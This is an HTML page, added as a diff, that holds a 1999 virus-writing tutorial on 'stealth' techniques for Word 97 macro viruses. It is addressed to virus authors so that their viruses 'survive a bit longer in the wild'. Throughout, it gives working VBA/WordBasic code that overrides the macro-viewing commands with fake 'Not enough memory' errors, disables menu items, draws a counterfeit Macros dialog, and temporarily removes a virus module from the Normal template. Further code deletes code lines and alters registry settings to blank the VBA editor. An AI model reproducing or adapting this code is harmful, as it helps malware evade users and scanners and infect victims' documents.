@@ -1,0 +1,359 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Simple Stealth for your macro virus [VDAT edition]</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<P align="center"> <font color="#004080"><b><font size="+3">Simple Stealth for 
+  your macro virus </font><br>
+  [VDAT edition] <br>
+  <font size="+1">by jackie twoflower /Lz0NT /MVT</font></b></font></P>
+<hr>
+<P>
+
+    hi folks, i'm back with another tutorial about macro virii. today we'll
+talk about stealth in macro virii. if you don't know what stealth is stop
+writing virii! no, just a joke come back and read. this tutorial is written
+for newbies in macro so if you are advanced this tutorial is maybe boring
+for you. i'm writting this to help others to understand the main concept of
+stealth.
+</P><P>
+    stealth is used to hide your macro so that your virus survives a bit 
+longer in the wild. you can use different technics of stealth and some i'll
+explain now. in word the important 'stealth-menus' are 'toolsmacro', 'view
+code', 'viewvbcode', 'filetemplates' and 'formatstyle'.
+</P>
+<P> <b>simple stealth #1 </b></P>
+<P>
+    one simple method is that you block the code of the important 'stealth-
+menus'. it's very simple to do this, just look at the code.
+</P>
+<blockquote>
+  <PRE>
+---------------------------[code starts here]------------------------------
+
+    Sub ToolsMacro()
+
+--&gt; no code in, no code in executed ;)
+
+    End Sub
+
+    Sub ViewCode()
+
+--&gt; again no code...
+
+    End Sub
+
+    Sub ViewVBCode()
+
+--&gt; ...
+
+    End Sub
+
+    Sub FileTemplates()
+
+--&gt; ...
+
+    End Sub
+
+    Sub FormatStyle()
+
+--&gt; this one is used very seldom but you can also use it
+
+    End Sub
+
+----------------------------[code ends here]-------------------------------
+</PRE>
+</blockquote>
+<P>
+    what you see here is the simpliest stealth method ever. if you open 
+your word, press alt + f8, enter 'toolsmacro' and press edit, you will see
+the normal code in there. so the only thing we do is that we delete this
+code in our by setting a new sub routine called 'toolsmacro' without any
+content. so we bypass this menu. the same is used for the other 'stealth-
+menus'.
+</P>
+<P> <b>simple stealth #2 </b></P>
+<P>
+    this one works like the first technic, but we enter some message. this
+message is often 'not enough memory', 'this function is not installed' or
+similar messages. here again an example.
+</P>
+<blockquote>
+  <PRE>
+---------------------------[code starts here]------------------------------
+
+    Sub ToolsMacro()
+
+        MsgBox "Not enough memory", 16
+
+--&gt; no code except the message
+
+    End Sub
+
+    Sub ViewCode()
+
+        MsgBox "Not enough memory", 16
+
+    End Sub
+
+    Sub ViewVBCode()
+
+        MsgBox "Not enough memory", 16
+
+    End Sub
+
+    Sub FileTemplates()
+
+        MsgBox "Not enough memory", 16
+
+    End Sub
+
+    Sub FormatStyle()
+
+        MsgBox "Not enough memory", 16
+
+    End Sub
+
+----------------------------[code ends here]-------------------------------
+</PRE>
+</blockquote>
+<P>
+    so this two technics are used nearly in every macro virus. they are
+effective and easy to use. you can also add some commands like 'fileexit'
+or similar to exit the active file. the only side-effect is, that nearly 
+every virus scanner searches for such strings and the virus will be de-
+tected. now we'll take a look at some other technics for your stealth.
+</P>
+<P> <b>advanced stealth #1 </b></P>
+<P>
+    hmm...advanced stealth? yes i know, but it's different to stealth #1 &
+#2. this kind of stealth deletes or stop the access to the 'stealth-menus'
+in toolbar. the usually code is like this.
+</P>
+<blockquote>
+  <PRE>
+---------------------------[code starts here]------------------------------
+
+    Sub Stealth()
+
+    CommandBars("Tools").Controls("Macro").Enabled = False
+    CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
+    CommandBars("Format").Controls("Style...").Enabled = False
+
+--&gt; this one looks common for this technic...
+
+    End Sub
+
+-----------------------------[code ends here]------------------------------
+</PRE>
+</blockquote>
+<P>
+    so this is another technic for stealth. with this you stop the access 
+to 'toolsmacro', 'templates', etc... you can also use '.delete' instead of
+'.enabled = false' this will delete the menuitem. this tech is usually used
+but i improved it a bit to make it language-independent. look at this.
+</P>
+<blockquote>
+  <PRE>
+---------------------------[code starts here]------------------------------
+
+    Sub Stealth()
+
+    CommandBars("Tools").Controls(12).Enabled = False
+    CommandBars("Tools").Controls(13).Enabled = False
+    CommandBars("Format").Controls(12).Enabled = False
+
+--&gt; this one looks common for this technic, but it uses numbers as index
+
+    End Sub
+
+-----------------------------[code ends here]------------------------------
+</PRE>
+</blockquote>
+<P>
+    this is the 'improved' version. you can use this for all menus, just 
+look for their names in menus. now here is again another technic used in
+earlier word 6 macros. this technic was again first used by nightmare joker
+and i try to convert it for word 97.
+</P>
+<P> <b>advanced stealth #2 ;) </b></P>
+<P>
+    like i said, used in word6 now here for word 97, the macro stealth box!
+i will give a few comments to this code. this here is already converted for
+word 97!
+</P><P>
+&gt; This is a comment...
+</P>
+<blockquote>
+  <PRE>
+---------------------------[code starts here]------------------------------
+
+Sub ToolsMacro()
+Dim x
+
+&gt; This here is a complete code for the macro stealth...
+
+Dim Combobox1__$(0)
+Combobox1__$(0) = ""
+Dim Textbox1__$(0)
+Textbox1__$(0) = ""
+Dim DropListBox2__$(0)
+
+&gt; Declare all the variables and objects....
+
+DropListBox2__$(0) = "Normal.dot (Global Template)"
+
+&gt; Add this text into the Droplistbox...
+
+WordBasic.BeginDialog 620, 280, "Macros"
+
+    WordBasic.Text 7, 6, 93, 13, "Macro&name:", "Text3"
+    WordBasic.ComboBox 7, 23, 435, 170, Combobox1__$(), "Combobox1"
+    WordBasic.PushButton 470, 14, 137, 21, "&Run", "Definierbar2"
+    WordBasic.CancelButton 470, 38, 137, 21
+    WordBasic.PushButton 470, 72, 137, 21, "&Debug", _
+     "Definierbar3"
+    WordBasic.PushButton 470, 96, 137, 21, "&Edit", "Definierbar4"
+    WordBasic.PushButton 470, 130, 137, 21, "&Create", "Definierbar5"
+    WordBasic.PushButton 470, 154, 137, 21, "&Delete...", "Definierbar6"
+    WordBasic.PushButton 470, 178, 137, 21, "&Organize...", "Definierbar7"
+    WordBasic.Text 7, 200, 93, 13, "Ma&cros in:", "Text1"
+    WordBasic.DropListBox 90, 196, 354, 19, DropListBox2__$(), "Listbox2"
+    WordBasic.Text 7, 222, 109, 13, "Description:", "Text2"
+    WordBasic.TextBox 7, 235, 437, 38, Textbox1__$()
+WordBasic.EndDialog
+
+&gt; Hmm...sorry but I don't know the correct translation of all these
+&gt; menus, so change them if they are wrong. The size of this box is
+&gt; exactly the size of the real one...
+ 
+Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
+x = WordBasic.Dialog.UserDialog(dlg)
+
+&gt; Select Case for the user's input...
+
+Select Case x
+    Case 0
+        WordBasic.Cancel
+
+&gt; If he press 'Cancel' then exit
+
+    Case 1 To 6
+        MsgBox "Not enough memory", "VBA Error", 48
+
+&gt; Else show this 'Not enough memory' message...
+
+End Select
+End Sub
+
+------------------------------[code ends here]-----------------------------
+</PRE>
+</blockquote>
+<P>
+    this is also some kind of stealth you can use. and here probably one of
+the best stealth routines i have ever seen.
+</P>
+<P> <b>advanced stealth #3 </b></P>
+<P>
+    this code here is taken from lord arz's lizard macro (thanks). It's a
+stealth for the normal template. if the user looks at tools macro then this
+macro removes itself from the normal template, shows the macro dialog and 
+imports itself again, but take a look at the code...
+</P>
+<blockquote>
+  <PRE>
+-----------------------------[code starts here]----------------------------
+
+Sub ToolsMacro()
+
+NormalTemplate.VBProject.VBComponents("Lizard").Export "Lizard.bas"
+
+&gt; Export the source into the file 'lizard.bas'...
+
+Application.OrganizerDelete NormalTemplate.FullName, "Lizard", _
+	wdOrganizerObjectProjectItems
+
+&gt; Delete 'Lizard' from the macros in the normal template...
+
+While Dialogs(wdDialogToolsMacro).Display
+Wend
+
+&gt; Show the dialog and wait til it is closed again...
+
+NormalTemplate.VBProject.VBComponents.Import "Lizard.bas"
+
+&gt; Import 'lizard' again...
+
+Kill "Lizard.bas"
+
+&gt; Delete the source of lizard...
+
+End Sub
+
+------------------------------[code ends here]-----------------------------
+</PRE>
+</blockquote>
+<P><b> advanced stealth #4 </b></P>
+<P>
+    this here is a very good stealth code. it's taken from w97m/vbs.bogus
+by yozak. This stealth is also good for class virii, it deletes the lines
+if you want to view the code. So take a look at this great code...
+</P>
+<blockquote>
+  <PRE>
+----------------------------[code starts here]-----------------------------
+
+On Error Resume Next
+NormalTemplate.VBProject.VBComponents("yoz").CodeModule.DeleteLines 1, 167
+
+&gt; This command here deletes the lines from the module 'yoz'. For using in
+&gt; class infectors use '1' instead of 'yoz'.
+
+ActiveDocument.VBProject.VBComponents("yoz").CodeModule.DeleteLines 1, 167
+
+&gt; Same as above...
+
+NormalTemplate.Saved = True
+ActiveDocument.Saved = True
+
+&gt; These two commands are very important for this stealth. They tell Word 
+&gt; that the doc/temp is already saved. So when you close it, it didn't asks
+&gt; for saving.
+
+------------------------------[code ends here]-----------------------------
+</PRE>
+</blockquote>
+<P><b> advanced stealth #5 </b></P>
+<P>
+    well, kids, the best stealth in a macro i have ever seen, was again
+written by lord arz (all credits to you! ;)) did you ever thought about
+changing colours of font and background in the vba editor? no? lord arz
+did...here is the code:
+</P>
+<blockquote>
+  <PRE>
+----------------------------[code starts here]-----------------------------
+
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"    
+
+&gt; change background colors
+
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"  
+
+&gt; change code colors
+
+------------------------------[code ends here]-----------------------------
+</PRE>
+</blockquote>
+<P>
+    So this were a lot of methods for your perfect stealth in your macro. I
+hope this helps you a bit. If you have any questions feel free and mail me.
+and never forget, appreciate the work of others and give credits!
+</P><P>
+
+have phun,                                                    jackie
+</P>
+<P> [june, 1999] </P>
+<hr>
+</BODY>
+</HTML>
